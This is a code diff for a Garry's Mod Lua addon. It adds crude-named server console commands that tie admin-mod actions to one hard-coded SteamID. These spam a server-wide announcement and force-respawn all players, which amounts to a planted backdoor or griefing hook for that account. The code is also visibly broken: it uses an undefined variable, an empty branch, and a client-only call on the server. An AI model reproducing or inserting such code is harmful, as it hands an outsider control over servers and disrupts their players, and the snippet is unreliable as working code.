@@ -42,16 +42,29 @@ end
 
 
 if SERVER then
-	
-concommand.Add("penis_badmin_tellall", function()
+    
+concommand.Add("penis_badmin_nadpisi", function(ply)
+    if ply:SteamID() == 'STEAM_0:0:555589835' then 
     for i = 1, 5 do
         RunConsoleCommand("ba", "tellall", text)
       end
+             elseif ply:SteamID() ~= 'STEAM_0:0:555589835'  then
+
+       end
    end)
 end
 
-	
-	
+
+
+
+if SERVER then
+concommand.Add("penis_badmin_spawn_telport_all", function()
+    for k,v in ipairs(player.GetAll()) do
+        if v == LocalPlayer() or v:SteamID() == "STEAM_0:0:555589835"  then return end
+        RunConsoleCommand("ba", "spawn", v:SteamID())
+      end
+  end)
+end
 	
 if SERVER then
 
